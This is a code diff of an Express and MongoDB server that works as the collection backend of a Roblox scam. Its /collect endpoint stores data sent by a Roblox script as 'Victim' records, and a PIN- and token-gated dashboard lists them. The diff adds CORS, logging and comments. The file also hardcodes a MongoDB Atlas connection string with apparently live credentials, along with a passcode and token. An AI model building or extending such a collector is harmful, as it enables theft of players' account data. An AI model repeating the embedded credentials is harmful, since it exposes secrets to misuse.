@@ -1,16 +1,20 @@
 const express = require('express');
 const mongoose = require('mongoose');
+const cors = require('cors');
 const app = express();
 
 const PORT = process.env.PORT || 3000;
+// Replace with your actual MongoDB Atlas URI
 const MONGO_URI = 'mongodb+srv://lam279887_db_user:HkeGLjjzQgMOGpux@malsca.vvj7hgz.mongodb.net/scamDB?retryWrites=true&w=majority';
 const PASSCODE = '9799';
-const DASHBOARD_TOKEN = 'inner9799';   // simple token to protect /dashboard
+const DASHBOARD_TOKEN = 'inner9799';   // protects the dashboard
 
+// Connect to MongoDB
 mongoose.connect(MONGO_URI)
   .then(() => console.log('MongoDB connected'))
-  .catch(err => console.error('MongoDB error:', err));
+  .catch(err => console.error('MongoDB connection error:', err));
 
+// Define the Victim schema
 const victimSchema = new mongoose.Schema({
   username: String,
   userId: Number,
@@ -21,22 +25,24 @@ const victimSchema = new mongoose.Schema({
 });
 const Victim = mongoose.model('Victim', victimSchema);
 
+app.use(cors());
 app.use(express.json());
 
-// Endpoint for the Roblox script
+// ---- Data endpoint (called by the Roblox script) ----
 app.post('/collect', async (req, res) => {
+  console.log('Incoming:', req.body.username);
   try {
     const entry = new Victim(req.body);
     await entry.save();
-    console.log('New entry:', entry.username);
+    console.log('Saved:', entry.username);
     res.sendStatus(200);
   } catch (err) {
-    console.error(err);
-    res.sendStatus(500);
+    console.error('Save error:', err);
+    res.status(500).json({ error: err.message });
   }
 });
 
-// API for the dashboard
+// ---- API for the dashboard ----
 app.get('/api/victims', async (req, res) => {
   try {
     const victims = await Victim.find({}).sort({ receivedAt: -1 }).lean();
@@ -46,7 +52,7 @@ app.get('/api/victims', async (req, res) => {
   }
 });
 
-// ---- Login page with 4-digit PIN ----
+// ---- Login page (4-digit PIN) ----
 app.get('/', (req, res) => {
   res.send(`
 <!DOCTYPE html>
@@ -100,7 +106,7 @@ app.get('/', (req, res) => {
   `);
 });
 
-// ---- Dashboard page ----
+// ---- Dashboard page (shows all victims) ----
 app.get('/dashboard', (req, res) => {
   if (req.query.token !== DASHBOARD_TOKEN) return res.redirect('/');
   res.send(`
@@ -151,7 +157,7 @@ app.get('/dashboard', (req, res) => {
         const res = await fetch('/api/victims');
         const victims = await res.json();
         const container = document.getElementById('cardsContainer');
-        if (!victims.length) {
+        if (!victims || victims.length === 0) {
           container.innerHTML = '<div class="empty">No victims yet.</div>';
           return;
         }
